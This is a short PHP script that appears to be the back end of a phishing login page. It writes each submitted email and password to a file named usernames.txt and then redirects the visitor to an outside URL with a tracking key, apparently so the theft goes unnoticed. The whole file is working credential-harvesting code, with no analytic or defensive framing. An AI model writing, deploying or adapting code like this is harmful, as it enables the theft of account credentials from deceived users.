<?php

file_put_contents("usernames.txt", "FF Username: " . $_POST['email'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://curioushingefast.com/vkjj0mzb9?key=22f7b28b1ab6735bd4320503cba3ab9a');
exit();
?>